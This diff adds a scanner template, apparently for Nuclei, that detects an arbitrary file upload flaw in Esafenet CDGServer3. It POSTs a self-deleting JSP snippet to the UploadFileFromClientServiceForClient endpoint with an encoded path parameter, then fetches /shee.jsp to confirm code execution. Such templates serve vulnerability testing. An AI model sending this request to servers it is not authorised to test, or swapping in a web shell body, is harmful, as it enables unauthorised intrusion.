@@ -1,0 +1,36 @@
+id: cdgserver3-uploadfilefromclientserviceforclient-file-upload
+info:
+  name: 亿赛通 CDGServer3 uploadfilefromclientserviceforclient 接口 - 任意文件上传漏洞
+  author: xiaobaicai
+  severity: high
+  reference:
+    - https://www.ddpoc.com/poc/DVB-2023-4611.html#
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: esafenet
+    product: cdgserver3
+  tags: file-upload,vuln,cdgserver3
+variables:
+  s1: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/CDGServer3/UploadFileFromClientServiceForClient?a=AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGEFOFMFLBDFAGOGM'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: <% out.println("{{s1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+  - method: GET
+    path:
+      - '{{BaseURL}}/shee.jsp'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, to_string(s1))'
